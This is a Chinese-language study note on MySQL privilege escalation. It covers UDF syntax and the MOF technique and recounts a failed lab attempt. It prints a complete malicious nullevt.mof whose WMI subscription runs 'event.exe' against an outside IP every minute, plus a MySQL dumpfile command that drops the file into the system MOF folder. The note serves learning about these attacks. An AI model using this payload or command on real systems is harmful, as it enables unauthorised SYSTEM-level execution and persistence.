# UDF提权

## 简介

MySQL的内置函数虽然丰富，但毕竟不能满足所有人的需要，有时候我们需要对表中的数据进行一些处理而内置函数不能满足需要的时候，就需要对MySQL进行一些扩展。幸运的是，MySQL给使用者提供了添加新函数的机制，这种使用者自行添加的MySQL函数就称为**UDF(User Define Function)**。其实除了UDF外，使用者还可以将函数添加为MySQL的固有（内建）函数，固有函数被编译进mysqld服务器中，使其永久可用。

**查看组件安装位置**

![](https://borinboy.oss-cn-shanghai.aliyuncs.com/huan20210828220059.png)

> 题外话：[phpadmin忘记密码后重置密码](https://m.php.cn/tool/phpmyadmin/441404.html)，重置之后使用`net start mysql`命令重启MySQL。



## UDF的特性

* 可以自定义函数功能
* 可以自定义函数返回值



## 相关语法

**创建UDF**

```sql
CREATE FUNCTION function_name(parameter_nametype,[parameter_name type,...])
RETURNS {STRING|INTEGER|REAL};
```

上面的意思是创建一个聚合或者是非聚合的函数，sql中调用的名称是function_name，返回类型是{STRING|INTEGER|REAL}其中的一种。

```sql
CREATE [AGGREGATE] FUNCTION function_name RETURNS {STRING|INTEGER|REAL} SONAME 'shared_library_name';
```

上面除了创建函数外，还生成动态链接库，shared_library_name是生成的动态链接库的名称。

创建成功后会从MySQL服务器的mysql数据库的func表中找到对应的一条记录的添加。

**查看UDF**

```sql
SHOW CREATE FUNCTION function_name;
```

**删除UDF**

```sql
DROP FUNCTION function_name;
```



# MOF提权

**什么是MOF？**

托管对象格式（MOF）文件是创建和注册提供程序、事件类别和事件的简便方法。在Windows系统的`c:/windows/system32/wbem/mof/nullevt.mof`目录下，其作用是每隔五秒就会去监控进程创建和死亡。

在MOF文件中创建类实例和类定义后，可以对该文件进行编译。编译MOF文件将在CIM储存库中注册所有的类定义和实例。之后，提供程序、事件类别和事件信息便可由WMI和Visual Studio Analyzer使用。 在MOF文件中创建提供程序、事件类别和事件类的实例，并且定义想要分析的自定义对象，之后，就可以对该文件进行编译。

**mof提权的原理**

当MySQL获取到root权限后，通过MySQL将该文件写入到指定路径下，以达到提权的效果。隔了一定时间以后这个MOF就会被执行，这个MOF当中有一段是vbs脚本，这个vbs脚本的内容大多数的是添加管理员用户或权限的命令。

nullevt.mof脚本源码

```
#pragma namespace("\\\\.\\root\\subscription")

instance of __EventFilter as $EventFilter
{
    EventNamespace = "Root\\Cimv2";
    Name  = "filtP2";
    Query = "Select * From __InstanceModificationEvent "
            "Where TargetInstance Isa \"Win32_LocalTime\" "
            "And TargetInstance.Second = 5";
    QueryLanguage = "WQL";
};

instance of ActiveScriptEventConsumer as $Consumer
{
    Name = "consPCSV2";
    ScriptingEngine = "JScript";
    ScriptText = 
    "var WSH = new ActiveXObject(\"WScript.Shell\")\nWSH.run(\"event.exe 85.25.67.37 12346\")";
};

instance of __FilterToConsumerBinding
{
    Consumer   = $Consumer;
    Filter = $EventFilter;
};
```

```mysql
select load_file('C:\Inetpub\wwwroot\www.demoasp.com\nullevt.mof') into dumpfile "C:\Windows\System32\wbem\MOF\nullevt.mof"
```

通过手动执行该命令发现老是报错`Can't create/write to file`，使用极端的办法将该目录授权为everyone可读写，依然报错。

![](https://borinboy.oss-cn-shanghai.aliyuncs.com/huan20210829202650.png)

转而使用msf来尝试，发现还是同样的报错。

![](https://borinboy.oss-cn-shanghai.aliyuncs.com/huan20210829202553.png)

```
[-] 192.168.50.75:3306 - MySQL Error: RbMysql::ServerError Can't create/write to file 'C:\windows\system32\ALJiU.exe' (Errcode: 13)
[*] 192.168.50.75:3306 - Uploading to 'C:/windows/system32/wbem/mof/eoaMG.mof'
[-] 192.168.50.75:3306 - MySQL Error: RbMysql::ServerError Can't create/write to file 'C:\windows\system32\wbem\mof\eoaMG.mof' (Errcode: 2)
```



## 总结

MySQL 5.7开始默认使用secure-file-priv选项，不能随意选择导出路径，所以mof提权仅适用于以下条件：

* 操作系统版本低于 win 2008

* 数据库为 MySQL < 5.7且知道登录账号密码并且允许外连

总结来说就是当前root账户可以复制文件到`%SystemRoot%\System32\wbem\MOF`目录下。



吐槽：数据库版本和系统版本都符合要求，为什么还是没有成功，看来只能再向大佬求助了。

![](https://borinboy.oss-cn-shanghai.aliyuncs.com/huan20210829203720.png)

![](https://borinboy.oss-cn-shanghai.aliyuncs.com/huan20210829204047.png)
